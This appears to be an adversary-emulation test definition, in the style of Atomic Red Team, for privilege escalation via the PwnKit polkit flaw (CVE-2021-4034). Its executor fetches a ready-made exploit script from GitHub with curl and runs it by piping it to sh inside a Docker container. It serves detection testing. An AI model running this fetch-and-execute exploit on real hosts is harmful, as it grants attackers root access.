attack_technique: T1068
display_name: Exploitation for Privilege Escalation
atomic_tests:
  - name: PwnKit vuln privilege escalation
    auto_generated_guid: c1ab0c34-8a8e-43ed-9518-b15724fbc1e1
  description: |
    Exploit vulnerabity CVE_2021_4034 in polkit to get local privilege escalation.
  supported_platforms:
  - linux
  input_arguments:
    exploit_url:
      description: Path to download ready-made exploit
      type: url
      default: https://raw.githubusercontent.com/ly4k/PwnKit/main/PwnKit.sh
  dependency_executor_name: bash
  dependencies:
  - description: |
      docker must be present
    prereq_command: |
      which docker
    get_prereq_command: |
      if [ "" == "`which docker`" ]; then echo "Docker Not Found"; if [ -n "`which apt-get`" ]; then sudo apt-get -y install docker ; elif [ -n "`which yum`" ]; then sudo yum -y install docker ; fi ; else echo "Docker installed"; fi
  - description: Verify docker service is running.
    prereq_command: |
      sudo systemctl status docker  --no-pager
    get_prereq_command: |
      sudo systemctl start docker
  executor:
    command: |-
      docker build -t cve_2021_4034  $PathtoAtomicsFolder/T1068/src/
      docker run --name CVE_2021_4034_container  -d -t cve_2021_4034
      docker exec CVE_2021_4034_container /bin/sh -c "$(curl -fsSL #{exploit_url})"
    cleanup_command: |-
      docker stop CVE_2021_4034_container
      docker rm CVE_2021_4034_container
      docker rmi -f cve_2021_4034
    name: sh
